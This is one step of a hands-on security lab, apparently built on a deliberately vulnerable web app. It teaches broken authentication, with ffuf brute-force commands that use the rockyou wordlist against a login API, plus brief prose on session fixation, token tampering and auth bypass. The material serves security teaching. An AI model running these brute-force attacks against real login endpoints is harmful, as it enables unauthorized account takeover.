# Step 3: Broken Authentication

In this step, we will explore broken authentication vulnerabilities within our web application. Broken authentication occurs when an application improperly implements authentication mechanisms, allowing attackers to compromise user accounts or gain unauthorized access.

## Objectives

- Understand the concept of broken authentication.
- Identify vulnerabilities in the login process.
- Exploit the vulnerabilities to gain unauthorized access.

## Vulnerable Code

The login functionality is implemented in `src/pages/api/login.ts`. Review the code to identify potential vulnerabilities. Look for:

- Lack of rate limiting on login attempts.
- Insecure password storage (e.g., plain text).
- Absence of account lockout mechanisms.

## Exploitation Steps

1. **Brute Force Attack with ffuf**: 
   Use `ffuf` to brute force the login endpoint at `/api/login`:

   ```bash
   ffuf -u http://<target-ip>:3010/api/login \
     -X POST \
     -H "Content-Type: application/json" \
     -d '{"username":"admin","password":"FUZZ"}' \
     -w /usr/share/wordlists/rockyou.txt \
     -fc 401
   ```

   > **Tip:** `-fc 401` filters out failed attempts (401 Unauthorized), so only successful logins are shown.

   You can also try other usernames:
   ```bash
   # Fuzz both username and password
   ffuf -u http://<target-ip>:3010/api/login \
     -X POST \
     -H "Content-Type: application/json" \
     -d '{"username":"FUZZ","password":"FUZZ2"}' \
     -w /usr/share/wordlists/common-users.txt:FUZZ \
     -w /usr/share/wordlists/rockyou.txt:FUZZ2 \
     -fc 401
   ```

2. **Session Fixation**:
   After logging in, check if the session token changes. If it does not, you can exploit this by forcing a user to log in with your session token.

3. **Token Manipulation**:
   If the application uses JWT or similar tokens, try manipulating the token to gain access to other users' sessions.

4. **Bypass Authentication**:
   Check if you can bypass authentication by manipulating the request parameters or headers.

## Commands to Run

- To test the login API, you can use `curl`:
  ```
  curl -X POST http://<target_ip>/api/login -d '{"username":"<username>","password":"<password>"}' -H "Content-Type: application/json"
  ```

- Monitor the responses to identify any weaknesses in the authentication process.

## Conclusion

By the end of this step, you should have a better understanding of broken authentication vulnerabilities and how to exploit them. Ensure to document your findings and prepare for the next step, where we will explore file upload vulnerabilities leading to remote code execution.